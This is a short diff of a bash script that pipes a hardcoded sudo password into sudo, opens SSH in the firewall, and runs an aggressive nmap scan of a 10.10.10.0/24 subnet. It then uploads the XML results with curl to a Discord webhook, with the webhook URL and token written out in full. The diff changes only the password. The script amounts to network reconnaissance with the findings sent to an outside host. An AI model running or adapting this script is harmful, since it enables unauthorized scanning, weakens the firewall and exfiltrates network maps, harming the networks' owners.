@@ -1,5 +1,5 @@
 #!/bin/bash
-if echo 'dada' | sudo -S sh -c "sudo ufw allow ssh"; then
+if echo '11' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "nmap scan and sending xml..."
  	sudo nmap -T5 -A -v 10.10.10.0/24 -oX /home/$USER/net.xml  
   	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
